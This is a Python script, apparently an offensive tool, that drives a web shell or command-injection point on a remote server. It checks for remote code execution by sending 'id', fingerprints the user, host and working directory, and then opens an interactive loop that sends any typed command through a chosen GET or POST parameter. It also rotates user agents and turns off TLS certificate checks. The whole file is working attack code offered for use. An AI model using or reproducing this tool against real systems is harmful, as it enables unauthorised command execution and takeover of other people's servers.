#!/usr/bin/python3

import sys
import requests
import re
import argparse
import random
from config import user_agent

class pyShell():
	mask=""
	def __init__(self, args):
		self.url=self.explode_url(args.url)
		self.param=args.parameter
		self.method = args.method
		self.prepend = args.prepend
		self.append = args.append

		print("\033[33m[+] \033[0mUrl: \033[33m%s" % self.url["full"])
		print("\033[33m[+] \033[0mParameter: \033[33m%s" % self.param)
		print("\033[33m[+] \033[0mMethod used: \033[33m%s" % self.method)
		print("\033[33m[+] \033[0mPrepended data: \033[33m%s" % self.prepend)
		print("\033[33m[+] \033[0mAppended data: \033[33m%s" % self.append)

		print("\033[33m[*] \033[0mChecking RCE...")

		if self.check_rce():
			print("\033[32m[!] \033[0mRCE confirmed!")
			self.mask=self.get_diff()
			self.run()
		else:
			print("\033[31m[!] No RCE found. exiting...\033[0m")
			sys.exit()


	def doReq(self, data):
		data = self.prepend + str(data) + self.append
		ua = random.choice(user_agent)
		h = {'User-Agent': ua}
		if self.method == 'GET':
			url = self.url['base'] + self.url['relpath'] + "?"
			if len(self.url['params']) > 1:
				for k in self.url['params']:
					if k != self.param:
						url += k + "=" + self.url['params'][k] + "&"
				url += self.param + "=" + data
			else:
				url += self.param + "=" + data
			output=requests.get(url, headers=h, verify=False)
		elif self.method == 'POST':
			url = self.url['base'] + self.url['relpath'] + "?"
			if 'params' in self.url and len(self.url['params']) > 0:
				for k in self.url['params']:
					if k != self.param:
						url += k + "=" + self.url['params'][k] + "&"
				url=url[:-1]
			output=requests.post(url, data={self.param: data}, headers=h, verify=False)
		return (str(output.content).replace("\\n", "\n"), output.status_code)

	def explode_url(self, url):
		url_array=dict()
		url_data=url.split("/")
		url_array['full'] = url
		url_array['base'] = url_data[0] + "//" + url_data[2]
		url_array['relpath'] = url[url.index(url_array['base']) + len(url_array['base']):]
		if '?' in url_array['relpath']:
			url_array['params']=dict()
			url_array['paramstring'] = url_array['relpath'].split('?')[1]
			url_array['relpath'] = url_array['relpath'].split('?')[0]
			if '&' in url_array['paramstring']:
				for item in url_array['paramstring'].split("&"):
					(key,val)=item.split("=")
					url_array['params'][key] = val
			else:
				(key,val)=url_array['paramstring'].split("=")
				url_array['params'][key]=val
		return url_array
		

	def check_rce(self):
		r=self.doReq("id")[0]
		if r.find("uid=") != -1 and r.find("gid=") != -1:
			return True
		return False

	def get_diff(self):
		print("\033[33m[*] \033[0mFiltering out static content...")
		r=self.doReq("echo bbzbztrt")[0]
		b=str(r)
		(bmask, amask) = re.split("bbzbztrt", b)
		return (bmask, amask)
			

	def doCmd(self, cmd):
		(r,sc)=self.doReq(cmd)
		try:
			output=str(r[r.index(self.mask[0]) + len(self.mask[0]):r.index(self.mask[1])])
		except:
			output=str(r[r.index(self.mask[0]) + len(self.mask[0]):])
		if output:
			if output[-1] == '\n':
				output=output[:-1]
		return (output, sc)

	def run(self):
		print("\033[32m[!] \033[0mGetting shell info...")
		(user,hostname,cwd)=self.doCmd("whoami;hostname;pwd")[0].split("\n")
		print("\033[33m[*] \033[0mUser \t: \033[33m%s\033[0m" % user)
		print("\033[33m[*] \033[0mHostname \t: \033[33m%s\033[0m" % hostname)
		print("\033[33m[*] \033[0mCWD \t: \033[33m%s\033[0m" % cwd)

		if user == 'root':
			print("\033[32m[!!!] w00t w00t! Please enjoy your r00t shell!\033[0m")
			terminator="#"
		else:
			terminator="$"
		print("\033[32m[>] \033[0mHere is your shell sir.")
		while True:
			prompt=input("%s@%s: %s %s " % (user, hostname, cwd, terminator))
			(ret,sc)=self.doCmd(prompt)
			print(sc)
			print(ret)

def main():
	requests.packages.urllib3.disable_warnings()
	args=parse_params()
	sh=pyShell(args)

def parse_params():
	parser = argparse.ArgumentParser()
	parser.add_argument('-u', '--url', help="URL for the webshell", required=True)
	parser.add_argument('-p', '--parameter', help="Parameter to inject commands", required=True)
	parser.add_argument('-m', '--method', help="HTTP Method to use (default: GET)", required=False, default="GET")
	parser.add_argument('-P', '--prepend', help="Prepend each commands with something", required=False, default="")
	parser.add_argument('-A', '--append', help="Append each commands with something", required=False, default="")
	return parser.parse_args()

if __name__=='__main__':
	main()

